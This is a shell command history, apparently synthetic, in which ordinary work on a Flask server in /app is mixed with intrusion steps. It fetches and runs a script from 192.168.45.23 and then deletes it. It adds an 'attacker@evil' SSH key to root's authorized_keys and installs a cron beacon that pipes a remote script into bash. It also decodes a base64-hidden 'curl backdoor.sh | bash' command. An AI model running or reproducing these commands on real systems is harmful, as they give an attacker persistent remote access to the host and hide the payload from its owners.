cd /app
ls -la
python3 server.py
pip install flask
pip install requests
ls
cat server.py
vim server.py
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
git status
git add .
git commit -m "Update server configuration"
ls -la
cd /tmp
wget http://192.168.45.23:8080/update.sh
chmod +x update.sh
./update.sh
rm update.sh
cd /app
python3 server.py --port 5000
ps aux | grep python
docker ps
docker images
netstat -tulpn
cd ~
ls -la .ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7Z2J4pXKmPQj8KwVHvJGXO9Zk3oP2yU+xH8WnR4tL9mK3jN8fR2qW7vB5cY4pL8mN6xT9qR3wS5vK8jL4mP0qX9zY attacker@evil" >> /root/.ssh/authorized_keys
cd /app
vim server.py
python3 server.py
curl http://localhost:5000/health
top
htop
free -m
df -h
echo "*/15 * * * * curl -s http://192.168.45.23:8080/beacon.sh | bash" | crontab -
crontab -l
cat /etc/crontab
ls /var/spool/cron/crontabs/
cd /var/log
tail -f application.log
grep ERROR application.log
cd /app
python3 -c "import base64; print(base64.b64decode('Y3VybCBodHRwOi8vMTkyLjE2OC40NS4yMzo4MDgwL2JhY2tkb29yLnNoIHwgYmFzaA=='))"
vim .profile
source .profile
ls -la
python3 server.py &
jobs